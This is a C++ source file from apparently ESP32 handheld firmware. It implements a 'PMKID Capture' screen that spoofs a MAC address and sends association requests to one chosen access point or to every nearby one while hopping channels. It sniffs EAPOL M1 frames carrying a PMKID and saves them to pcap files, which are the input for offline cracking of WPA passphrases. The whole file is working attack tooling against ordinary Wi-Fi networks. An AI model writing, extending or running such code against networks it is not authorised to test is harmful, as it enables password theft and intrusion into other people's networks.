#include "WifiPmkidCaptureScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "utils/network/WifiAttackUtil.h"
#include "utils/network/PmkidUtil.h"
#include "utils/network/EapolUtil.h"
#include "utils/network/PcapWriter.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>
#include <esp_wifi.h>
#include <cstring>

// ── Static definitions ────────────────────────────────────────────────────
const char* WifiPmkidCaptureScreen::SAVE_DIR = "/unigeek/wifi/eapol";
WifiPmkidCaptureScreen::Raw WifiPmkidCaptureScreen::_ring[RING] = {};
volatile int WifiPmkidCaptureScreen::_ringHead = 0;
volatile int WifiPmkidCaptureScreen::_ringTail = 0;
WifiPmkidCaptureScreen* WifiPmkidCaptureScreen::_self = nullptr;

WifiPmkidCaptureScreen::~WifiPmkidCaptureScreen()
{
  _stopCapture();
}

void WifiPmkidCaptureScreen::configureFromChannel(uint8_t channel, const uint8_t* bssid, const char* ssid)
{
  _mode = MODE_TARGET;
  _fromContext = true;
  if (bssid) {
    memcpy(_target.bssid, bssid, 6);
    _target.channel = (channel >= 1 && channel <= 13) ? (int)channel : 1;
    _target.ssid = (ssid && ssid[0]) ? String(ssid) : String("-");
  }
}

void WifiPmkidCaptureScreen::onInit()
{
  // Spoofed, locally-administered unicast STA MAC for the association requests.
  for (int i = 1; i < 6; i++) _spoofMac[i] = (uint8_t)random(256);
  _spoofMac[0] = 0x02;

  if (_fromContext) {
    _startCapture();
    if (_state != STATE_RUNNING) { _fromContext = false; _showMain(); }
    return;
  }
  _showMain();
}

void WifiPmkidCaptureScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MAIN) {
    _mainSel = index;
    if (index == 0) {
      _mode = (_mode == MODE_TARGET) ? MODE_ALL : MODE_TARGET;
      _showMain();
    } else if (_mode == MODE_TARGET) {
      if (index == 1) _selectWifi();
      else if (index == 2) _startCapture();
    } else {  // MODE_ALL
      if (index == 1) _startCapture();
    }
  } else if (_state == STATE_SELECT_WIFI) {
    if (index == 0) { _selectWifi(true); return; }
    const int scanIndex = (int)index - 1;
    if (scanIndex < 0 || scanIndex >= _scanCount) return;
    _target.ssid    = _scanLabels[scanIndex];
    _target.channel = _scanChannels[scanIndex];
    sscanf(_scanValues[scanIndex], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _showMain();
  }
}

void WifiPmkidCaptureScreen::onUpdate()
{
  if (_state != STATE_RUNNING) { ListScreen::onUpdate(); return; }

  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) { _stopCapture(); return; }
  }

  // Drain captured frames.
  while (_ringTail != _ringHead) {
    const Raw& r = _ring[_ringTail];
    _processFrame(r.data, r.len, r.channel);
    _ringTail = (_ringTail + 1) % RING;
  }

  // All mode hops channels to discover + probe every AP; Target stays put.
  const unsigned long now = millis();
  if (_mode == MODE_ALL) {
    static unsigned long lastHop = 0;
    if (now - lastHop > 300) {
      _allChanHop = (uint8_t)((_allChanHop % 13) + 1);
      _channel = _allChanHop;
      if (_attacker) _attacker->setChannel(_channel);
      lastHop = now;
    }
  }

  // Periodically clear probed flags on APs we haven't captured yet, so a missed
  // M1 gets another association request.
  if (now >= _reprobeAt) {
    for (int i = 0; i < _apCount; i++)
      if (!_aps[i].saved) _aps[i].probed = false;
    _reprobeAt = now + 3000;
  }

  _probe();

  _statusTitle = "PMKID Capture";
  if (_mode == MODE_ALL) {
    _statusDetail = String(_pmkids) + " PMKIDs / " + String(_apCount) + " APs";
  } else {
    const bool got = _apCount > 0 && _aps[0].saved;
    _statusDetail = _target.ssid + (got ? String(": captured") : String(": probing..."));
  }

  render();
  delay(80);
}

void WifiPmkidCaptureScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI)  _showMain();
  else if (_state == STATE_RUNNING) _stopCapture();
  else                              Screen.goBack();
}

void WifiPmkidCaptureScreen::onRender()
{
  if (_state == STATE_RUNNING) { _drawStatus(_statusTitle.c_str(), _statusDetail.c_str()); return; }
  ListScreen::onRender();
}

// ── Menu ──────────────────────────────────────────────────────────────────
void WifiPmkidCaptureScreen::_showMain()
{
  _state = STATE_MAIN;
  _modeSub = (_mode == MODE_TARGET) ? "Target" : "All";
  _mainItems[0] = {"Mode", _modeSub.c_str()};

  uint8_t itemCount;
  if (_mode == MODE_TARGET) {
    _targetSub = _target.ssid;
    _mainItems[1] = {"Access Point", _targetSub.c_str()};
    _mainItems[2] = {"Start"};
    itemCount = 3;
  } else {
    _mainItems[1] = {"Start"};
    itemCount = 2;
  }

  if (_mainSel >= itemCount) _mainSel = 0;
  setItems(_mainItems, itemCount, _mainSel);
}

void WifiPmkidCaptureScreen::_showScanResults()
{
  _state = STATE_SELECT_WIFI;
  _scanItems[0] = {"Rescan"};
  for (int i = 0; i < _scanCount; i++) {
    _scanItems[i + 1] = {_scanLabels[i], _scanDisplay[i]};
    _scanItems[i + 1].rssi            = _scanRssi[i];
    _scanItems[i + 1].hasRssi         = true;
    _scanItems[i + 1].sublabelMarquee = true;
  }
  setItems(_scanItems, _scanCount + 1);
}

void WifiPmkidCaptureScreen::_selectWifi(bool forceScan)
{
  if (_scanValid && !forceScan) { _showScanResults(); return; }

  _state = STATE_SELECT_WIFI;
  render();
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  WiFi.scanDelete();
  const int total = WiFi.scanNetworks();
  _scanCount = total > MAX_SCAN ? MAX_SCAN : (total > 0 ? total : 0);
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "%s", WiFi.SSID(i).c_str());
    _scanChannels[i] = (uint8_t)WiFi.channel(i);
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s", WiFi.BSSIDstr(i).c_str());
    snprintf(_scanDisplay[i], sizeof(_scanDisplay[i]), "%s CH%u", _scanValues[i], (unsigned)_scanChannels[i]);
    _scanRssi[i] = (int16_t)WiFi.RSSI(i);
  }
  WiFi.scanDelete();
  _scanValid = true;

  if (_scanCount == 0) ShowStatusAction::show("No networks found");
  _showScanResults();
}

// ── AP table ──────────────────────────────────────────────────────────────
int WifiPmkidCaptureScreen::_findAp(const uint8_t* bssid) const
{
  for (int i = 0; i < _apCount; i++)
    if (memcmp(_aps[i].bssid, bssid, 6) == 0) return i;
  return -1;
}

int WifiPmkidCaptureScreen::_ensureAp(const uint8_t* bssid, uint8_t ch)
{
  int i = _findAp(bssid);
  if (i >= 0) { if (ch) _aps[i].channel = ch; return i; }
  if (_apCount >= MAX_AP) return -1;
  ApInfo& a = _aps[_apCount];
  memset(&a, 0, sizeof(a));
  memcpy(a.bssid, bssid, 6);
  a.channel = ch;
  return _apCount++;
}

// ── Capture ───────────────────────────────────────────────────────────────
void WifiPmkidCaptureScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  auto* self = _self;
  if (!self || !buf) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const auto* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* p = pkt->payload;
  const uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 24 || len > MAXF) return;

  const bool beacon = (type == WIFI_PKT_MGMT) && (((p[0] >> 4) & 0x0F) == 8);
  bool eapol = false;
  if (type == WIFI_PKT_DATA) {
    for (uint16_t i = 24; i + 8 <= len && i < 80; i++) {
      if (p[i] == 0xAA && p[i+1] == 0xAA && p[i+2] == 0x03 &&
          p[i+6] == 0x88 && p[i+7] == 0x8E) { eapol = true; break; }
    }
  }
  if (!beacon && !eapol) return;

  const int head = _ringHead;
  const int next = (head + 1) % RING;
  if (next == _ringTail) return;   // ring full → drop
  Raw& r = _ring[head];
  memcpy(r.data, p, len);
  r.len = len;
  r.channel = pkt->rx_ctrl.channel;
  _ringHead = next;
}

void WifiPmkidCaptureScreen::_processFrame(const uint8_t* data, uint16_t len, uint8_t ch)
{
  const uint8_t ftype  = (data[0] >> 2) & 0x03;
  const uint8_t fc_sub = (data[0] >> 4) & 0x0F;

  if (ftype == 0 && fc_sub == 8) {   // beacon → learn SSID + keep first beacon
    const uint8_t* bssid = data + 16;
    int idx = _ensureAp(bssid, ch);
    if (idx < 0) return;
    ApInfo& ap = _aps[idx];
    if (!ap.ssidKnown && len > 38) {
      uint16_t pos = 36;             // 24 MAC hdr + 12 fixed params
      while (pos + 2 <= len) {
        const uint8_t id = data[pos], l = data[pos + 1];
        if (pos + 2 + l > len) break;
        if (id == 0) {               // SSID IE
          if (l > 0 && l <= 32) { memcpy(ap.ssid, data + pos + 2, l); ap.ssid[l] = '\0'; ap.ssidKnown = true; }
          break;
        }
        pos += 2 + l;
      }
    }
    if (ap.beaconLen == 0 && len <= sizeof(ap.beacon)) { memcpy(ap.beacon, data, len); ap.beaconLen = len; }
    return;
  }

  // Data frame: an EAPOL M1 with a PMKID?
  EapolUtil::Frame f;
  if (EapolUtil::parse(data, len, f) == EapolUtil::MSG_M1 && PmkidUtil::hasPmkid(data, len)) {
    const uint8_t* bssid = data + 10;   // M1 is AP→STA (fromDS): addr2 = BSSID
    int idx = _findAp(bssid);
    if (idx < 0) idx = _ensureAp(bssid, ch ? ch : _channel);
    if (idx < 0) return;
    ApInfo& ap = _aps[idx];
    if (ap.saved) return;
    _saveCapture(ap, data, len);
    ap.saved = true;
    _pmkids++;
    if (Uni.Speaker) Uni.Speaker->beep();
  }
}

void WifiPmkidCaptureScreen::_probe()
{
  const unsigned long now = millis();
  if (now - _lastProbeMs < 150) return;
  for (int i = 0; i < _apCount; i++) {
    ApInfo& ap = _aps[i];
    if (ap.probed || ap.saved) continue;
    if (ap.channel != _channel) continue;
    if (!ap.ssidKnown || ap.ssid[0] == '\0') continue;
    PmkidUtil::sendAssocRequest(ap.bssid, _spoofMac, ap.ssid, (uint8_t)strlen(ap.ssid));
    ap.probed = true;
    _lastProbeMs = now;
    return;   // one probe per tick
  }
}

void WifiPmkidCaptureScreen::_saveCapture(ApInfo& ap, const uint8_t* m1, uint16_t m1Len)
{
  if (!Uni.Storage) return;
  PcapWriter w;
  String ssid = ap.ssidKnown ? String(ap.ssid) : String("pmkid");
  if (!w.begin(Uni.Storage, SAVE_DIR, ssid, PcapWriter::LINKTYPE_IEEE802_11, MAXF)) return;
  const uint32_t sec = w.baseEpoch();
  if (ap.beaconLen) w.writeFrame(ap.beacon, ap.beaconLen, ap.beaconLen, sec, 0);
  w.writeFrame(m1, m1Len, m1Len, sec, 0);
  w.flush();
  w.end();
}

// ── Start / Stop ──────────────────────────────────────────────────────────
void WifiPmkidCaptureScreen::_startCapture()
{
  if (_mode == MODE_TARGET) {
    const MacAddr blank = {0, 0, 0, 0, 0, 0};
    if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
      ShowStatusAction::show("Access Point not set");
      return;
    }
  }

  _apCount   = 0;
  _pmkids    = 0;
  _ringHead  = _ringTail = 0;
  _allChanHop = 0;
  _lastProbeMs = 0;
  _reprobeAt = millis() + 3000;

  if (Uni.Storage) { Uni.Storage->makeDir("/unigeek/wifi"); Uni.Storage->makeDir(SAVE_DIR); }

  // Seed the target AP so we probe it immediately (Target mode).
  if (_mode == MODE_TARGET) {
    int idx = _ensureAp(_target.bssid, (uint8_t)_target.channel);
    if (idx >= 0 && _target.ssid != "-") {
      snprintf(_aps[idx].ssid, sizeof(_aps[idx].ssid), "%s", _target.ssid.c_str());
      _aps[idx].ssidKnown = _aps[idx].ssid[0] != '\0';
    }
    _channel = (uint8_t)_target.channel;
  } else {
    _channel = 1;
  }

  _state       = STATE_RUNNING;
  _chromeDrawn = false;
  _statusTitle  = "PMKID Capture";
  _statusDetail = (_mode == MODE_ALL) ? String("Scanning...") : (_target.ssid + ": probing...");
  render();   // paint before the blocking radio init in the ctor

  _attacker = new WifiAttackUtil();
  _attacker->setChannel(_channel);
  _self = this;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&WifiPmkidCaptureScreen::_promiscuousCb);
  render();
}

void WifiPmkidCaptureScreen::_stopCapture()
{
  if (_self == this) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    _self = nullptr;
  }
  if (_attacker) { delete _attacker; _attacker = nullptr; }

  if (_state == STATE_RUNNING) {
    ShowStatusAction::show("Stopped", 1000);
    if (_fromContext) { _fromContext = false; Screen.goBack(); }
    else              _showMain();
  }
}

// ── Running view ────────────────────────────────────────────────────────────
void WifiPmkidCaptureScreen::_drawStatus(const char* titleLine, const char* detailLine)
{
  auto& lcd = Uni.Lcd;
  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    _chromeDrawn = true;
  }

  const int lineH  = lcd.fontHeight();
  const int labelH = lineH * 2 + 6;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  if (!sp.createSprite(bodyW(), labelH)) return;
  sp.fillSprite(TFT_BLACK);
  sp.setTextSize(1);
  sp.setTextDatum(MC_DATUM);

  const int maxTextW = bodyW() - 8;
  auto fit = [&](String t) -> String {
    if (sp.textWidth(t.c_str()) <= maxTextW) return t;
    while (t.length() > 1 && sp.textWidth((t + "...").c_str()) > maxTextW) t.remove(t.length() - 1);
    return t + "...";
  };

  sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
  sp.drawString(fit(String(titleLine)).c_str(), bodyW() / 2, lineH / 2 + 1);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  sp.drawString(fit(String(detailLine)).c_str(), bodyW() / 2, lineH + lineH / 2 + 5);

  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}
